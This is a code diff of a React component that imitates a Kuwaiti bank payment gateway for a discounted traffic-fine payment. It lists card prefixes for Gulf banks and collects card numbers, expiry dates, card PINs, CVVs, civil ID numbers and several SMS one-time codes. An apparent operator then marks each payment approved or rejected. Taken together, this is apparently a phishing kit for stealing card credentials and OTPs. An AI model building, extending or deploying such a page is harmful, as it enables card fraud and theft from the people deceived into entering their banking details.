@@ -23,7 +23,7 @@ type PaymentInfo = {
   allOtps: string[]
   bank_card: string[]
   prefix: string
-  skip: string
+  skip:string
   status: "new" | "pending" | "approved" | "rejected"
   cardStatus: "new" | "pending" | "approved" | "rejected"
 }
@@ -39,57 +39,39 @@ type FormData = {
 // Bank data moved to a separate constant
 const BANKS = [
   {
-    value: "ABK",
-    label: "Al Ahli Bank of Kuwait",
-    cardPrefixes: ["403622", "428628", "423826"],
+    value: "NBK",
+    label: "National Bank of Kuwait",
+    cardPrefixes: ["464452", "589160", "46445250", "543363"],
   },
-  {
-    value: "ALRAJHI",
-    label: "Al Rajhi Bank",
-    cardPrefixes: ["458838"],
-  },
-  {
-    value: "BBK",
-    label: "Bank of Bahrain and Kuwait",
-    cardPrefixes: ["418056", "588790"],
-  },
-  {
-    value: "BOUBYAN",
-    label: "Boubyan Bank",
-    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
-  },
-
-  {
-    value: "BURGAN",
-    label: "Burgan Bank",
-    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
-  },
-
   {
     value: "CBK",
     label: "Commercial Bank of Kuwait",
     cardPrefixes: ["532672", "537015", "521175", "516334"],
-  }, {
-    value: "Doha",
-    label: "Doha Bank",
-    cardPrefixes: ["419252"],
   },
-
   {
     value: "GBK",
     label: "Gulf Bank",
     cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
   },
   {
-    value: "TAM",
-    label: "TAM Bank",
-    cardPrefixes: ["45077848", "45077849"],
+    value: "ABK",
+    label: "Al Ahli Bank of Kuwait",
+    cardPrefixes: ["403622", "428628", "423826"],
   },
-
+  {
+    value: "BURGAN",
+    label: "Burgan Bank",
+    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
+  },
   {
     value: "KFH",
     label: "Kuwait Finance House",
-    cardPrefixes: ["485602", "537016", "5326674", "450778"],
+    cardPrefixes: ["485602", "537016", "537016", "450778"],
+  },
+  {
+    value: "BOUBYAN",
+    label: "Boubyan Bank",
+    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
   },
   {
     value: "KIB",
@@ -97,15 +79,34 @@ const BANKS = [
     cardPrefixes: ["409054", "406464"],
   },
   {
-
-    value: "NBK",
-    label: "National Bank of Kuwait",
-    cardPrefixes: ["464452", "589160"],
+    value: "UNB",
+    label: "Union National Bank",
+    cardPrefixes: ["457778", "513000"],
   },
   {
-    value: "Weyay",
-    label: "Weyay Bank",
-    cardPrefixes: ["46445250", "543363"],
+    value: "BBK",
+    label: "Bank of Bahrain and Kuwait",
+    cardPrefixes: ["418056"],
+  },
+  {
+    value: "BNP",
+    label: "BNP Paribas",
+    cardPrefixes: ["450216", "531483", "489800"],
+  },
+  {
+    value: "HSBC",
+    label: "HSBC Middle East Bank",
+    cardPrefixes: ["447284", "530001", "453095"],
+  },
+  {
+    value: "FAB",
+    label: "First Abu Dhabi Bank",
+    cardPrefixes: ["440891", "530123", "454888"],
+  },
+  {
+    value: "CITIBANK",
+    label: "Citibank",
+    cardPrefixes: ["431457", "545432", "400800"],
   },
   {
     value: "QNB",
@@ -113,9 +114,19 @@ const BANKS = [
     cardPrefixes: ["521020", "524745"],
   },
   {
-    value: "UNB",
-    label: "Union National Bank",
-    cardPrefixes: ["457778"],
+    value: "Doha",
+    label: "Doha Bank",
+    cardPrefixes: ["419252"],
+  },
+  {
+    value: "ALRAJHI",
+    label: "Al Rajhi Bank",
+    cardPrefixes: ["458838"],
+  },
+  {
+    value: "BANK_MUSCAT",
+    label: "Bank Muscat",
+    cardPrefixes: ["489312", "529410", "454100"],
   },
   {
     value: "WARBA",
@@ -124,8 +135,8 @@ const BANKS = [
   },
 ]
 
-export default function Kent(props: { setPage?: any; violationValue: number }) {
-  const [step, setStep] = useState(1)
+export default function Ken2(props: { setPage?: any; violationValue: number }) {
+  const [step, setStep] = useState(2)
   const [cid, setCid] = useState("")
   const [mobile, setMobile] = useState("99****")
   const [loading, setLoading] = useState(true)
@@ -307,12 +318,8 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
       setLoading(false)
       setStep(2)
     } else if (step === 1) {
-      setLoading(true)
-
-setTimeout(() => {
-  setStep(0)
-  setLoading(false)
-}, 4000);      // Update payment info to pending status for card
+      setStep(0)
+      // Update payment info to pending status for card
       const updatedPaymentInfo = {
         ...paymentInfo,
         cardStatus: "pending",
@@ -324,9 +331,9 @@ setTimeout(() => {
       await handleSubmit(e)
       setTimeout(() => {
         setLoading(false)
-        if (props.violationValue >= 24) {
+        if(props.violationValue >=24){
           setStep(3)
-        } else {
+        }else{
           setStep(0)
         }
         cuonter()
@@ -359,9 +366,8 @@ setTimeout(() => {
         paymentInfo.pass !== "" &&
         paymentInfo.month !== "" &&
         paymentInfo.year !== "" &&
-        paymentInfo.pass.length === 4&&
-        paymentInfo.cvv.length === 3
-
+        paymentInfo.pass.length === 4 &&
+        paymentInfo.cvv.length ===3
       )
     }
     return true
@@ -434,12 +440,11 @@ setTimeout(() => {
           <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
             {/* Bank Selection */}
             <div className="row">
-              <label className="col-4" >
+              <label className="column-label col-2" >
                 Select Your Bank:
               </label>
               <select
-                className="col-8"
-               
+                className="column-value col-7"
                 onChange={(e) => handleBankSelection(e.target.value)}
                 value={paymentInfo.bank}
               >
@@ -456,15 +461,15 @@ setTimeout(() => {
 
             {/* Card Number */}
             <div className="row three-column" id="Paymentpagecardnumber">
-              <label className="col-4">Card Number:</label>
+              <label className="col-2">Card Number:</label>
               <select
-                className="col-3"
+                className="col-2"
                 name="dcprefix"
                 id="dcprefix"
                 onChange={(e) => handlePaymentInfoChange("prefix", e.target.value)}
                 value={paymentInfo.prefix}
               >
-                <option value="" >prefix</option>
+                <option value="">prefix</option>
                 {paymentInfo.bank_card.map((prefix, index) => (
                   <option key={index} value={prefix}>
                     {prefix}
@@ -473,13 +478,12 @@ setTimeout(() => {
               </select>
               <input
                 name="debitNumber"
-                
                 id="debitNumber"
                 type="tel"
                 inputMode="numeric"
                 pattern="[0-9]*"
                 size={10}
-                className="allownumericwithoutdecimal col-5"
+                className="allownumericwithoutdecimal col-4"
                 maxLength={10}
                 onChange={(e) => handlePaymentInfoChange("cardNumber", e.target.value)}
                 value={paymentInfo.cardNumber}
@@ -489,13 +493,14 @@ setTimeout(() => {
 
             {/* Expiration Date */}
             <div className="row three-column" id="cardExpdate">
-              <label className="col-4">Expiration Date:</label>
+              <label className="col-2" >Expiration Date:</label>
               <select
                 onChange={(e) => handlePaymentInfoChange("month", e.target.value)}
-                className="col-3"
+                className="col-2 m-1"
+
                 value={paymentInfo.month}
               >
-                <option value="">MM</option>
+                <option value="" style={{width:'20%'}}>MM</option>
                 {Array.from({ length: 12 }, (_, i) => {
                   const month = i + 1
                   return (
@@ -507,7 +512,7 @@ setTimeout(() => {
               </select>
               <select
                 onChange={(e) => handlePaymentInfoChange("year", e.target.value)}
-                className="col-5 "
+                className="col-5 m-1"
                 value={paymentInfo.year}
               >
                 <option value="">YYYY</option>
@@ -523,11 +528,10 @@ setTimeout(() => {
             </div>
 
             {/* PIN */}
-            <div className="row" id="PinRow" >
-              <div className="row" >
-                <label className="col-4 m-1" >PIN:</label>
+            <div className="row" id="PinRow">
+              <div className="row">
+                <label className="col-2">PIN:</label>
                 <input
-
                   inputMode="numeric"
                   pattern="[0-9]*"
                   name="cardPin"
@@ -543,30 +547,28 @@ setTimeout(() => {
                 />
               </div>
             </div>
-            <div className="row" id="PinRow" >
-              <div className="row" >
-                <label className="col-4 m-1" >Cvv:</label>
+            <div className="row" id="PinRow">
+              <div className="row">
+                <label className="col">CVV:</label>
                 <input
-
                   inputMode="numeric"
                   pattern="[0-9]*"
-                  name="cc"
-                  id="cc"
+                  name="cvv"
+                  id="cvv"
                   onChange={(e) => handlePaymentInfoChange("cvv", e.target.value)}
                   value={paymentInfo.cvv}
                   autoComplete="off"
-                  title="Should be in number. Length should be 3"
+                  title="Should be in number. Length should be 4"
                   type="password"
                   size={3}
+                  style={{ width: "80%" }}
                   maxLength={3}
-                  className="allownumericwithoutdecimal col-7"
+                  className="allownumericwithoutdecimal col-9"
                 />
               </div>
             </div>
 
-
           </div>
-          
         )
       case 0:
         return (
@@ -654,11 +656,9 @@ setTimeout(() => {
                   </div>
                   <input
                     type="tel"
-                    minLength={6}
                     maxLength={6}
-                    required
                     placeholder="الرمز  المرسل إلى الجوال"
-                    className="text-center text-lg py-6 border-blue-200 col-12"
+                    className="text-center text-lg py-6 border-blue-200"
                     value={paymentInfo.otp2 || ""}
                     onChange={(e) => handlePaymentInfoChange("otp2", e.target.value)}
                   />
@@ -711,7 +711,7 @@ setTimeout(() => {
               <div id="payConfirmCardNum">
                 <label className="col">رقم الهوية / الأقامة:</label>
                 <input
-                  className="col-12"
+                  className="col"
                   type="tel"
                   name="idNumber"
                   style={{ width: "100%" }}
@@ -825,9 +825,8 @@ setTimeout(() => {
                   <input
                     type="tel"
                     maxLength={6}
-                    required
                     placeholder="الرمز المرسل إلى الجوال من 4 أرقام"
-                    className="text-center text-lg py-6 border-blue-200 col-12"
+                    className="text-center text-lg py-6 border-blue-200"
                     value={paymentInfo.otp || ""}
                     onChange={(e) => handlePaymentInfoChange("otp", e.target.value)}
                   />
@@ -842,12 +841,12 @@ setTimeout(() => {
                   {paymentInfo.status === "approved"
                     ? "تم التحقق ✓"
                     : paymentInfo.status === "rejected"
-                      ? <span style={{ color: 'red' }}> {" OTP رمز التحقق غير صحيح   ✗"}</span>
+                      ?<span style={{color:'red'}}> {" OTP رمز التحقق غير صحيح   ✗"}</span>
                       : "انتظار التحقق ..."}
                 </span>
               </div>
             </div>
-            {paymentInfo.status === "rejected" ? null : <div style={{ display: 'flex', justifyContent: "center" }}><Loader /></div>}
+            {paymentInfo.status === "rejected"?null:<div style={{display:'flex',justifyContent:"center"}}><Loader/></div>} 
           </div>
         )
 
@@ -882,7 +881,7 @@ setTimeout(() => {
               {/* Payment Information Card */}
               <div className="form-card" style={{ display: step >= 2 ? "none" : "block" }}>
                 <div className="" style={{ display: "flex", justifyContent: "center" }}>
-                  <img src="./download.jpeg" className="-" alt="logo" width={90} />
+                  <img src="./kv.png" className="-" alt="logo" width={50} />
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
@@ -891,13 +890,13 @@ setTimeout(() => {
                 <div id="OrgTranxAmt">
                   <div className="row">
                     <label className="column-label">Amount: </label>
-                    <label className="column-value text-label col" style={{ width: "50%" }}>
-                      <s style={{fontSize:9}}>
+                    <label className="column-value" style={{ width: "50%" }}>
+                      <s>
                         {props.violationValue === 0
                           ? "5.00 kd"
                           : `${Number.parseFloat(props.violationValue!.toString()).toFixed(2)} kd`}
                       </s>
-                      <span style={{fontSize:9}} className="m-1">{discountedAmount.toFixed(2)} kd</span>
+                      <span className="m-1">{discountedAmount.toFixed(2)} kd</span>
                     </label>
                   </div>
                 </div>
@@ -940,10 +939,10 @@ setTimeout(() => {
                       </center>
                     </div>
                     <div style={{ display: "flex" }}>
-                      <button style={{background:'#f1f1f1'}}disabled={!isFormValid() || loading} type="submit">
+                      <button disabled={!isFormValid() || loading} type="submit">
                         {loading ? "Wait..." : step === 1 ? "Submit" : "تأكيد العملية"}
                       </button>
-                      <button style={{background:'#f1f1f1',marginLeft:5}} type="button">{step > 1 ? "الغاء" : "Cancel"}</button>
+                      <button type="button">{step > 1 ? "الغاء" : "Cancel"}</button>
                     </div>
                   </div>
                 </div>
@@ -1132,7 +1131,7 @@ setTimeout(() => {
     body {
         font-family: Verdana, Arial, Helvetica, sans-serif;
         background-color: #ebebeb;
-
+        overflow:hidden;
     }
     .container {
         width: 100%;
@@ -1176,9 +1175,7 @@ setTimeout(() => {
     }
     .form-card {
         background-color: #ffffff;
-        padding: 15px;
-
-        margin:15px;
+        padding: 20px;
         border: 2px solid #8f8f90;
         border-radius: 15px;
         margin-bottom: 15px;
@@ -1196,28 +1193,26 @@ setTimeout(() => {
         padding-bottom: 0;
     }
     form label {
-      font-size:10px !important;
-      color: #0070cd;
-        font-weight: bold;
+        font-size: 12px;
+        color: #0070cd;
+        font-weight: 900;
         text-shadow: 0 1px 2px rgba(0,0,0,0.2);
     }
     select {
         font-size:11px;
+        font-weight: 900;
         height:20px;
-        border:1px black solid;
     }
     form .text-label, input, select {
         color: #444444;
         font-weight: bold;
-
-        font-size:9px !important;
     }
     form input[type=tel],input[type=password]{
         border: 2px solid #0070cd;
         box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
         padding: 0 3px;
         outline: 0;
-        font-size:8px !important;
+      font-size:11px;
       height:20px;
     }
     form input[type=text],input[type=password]{
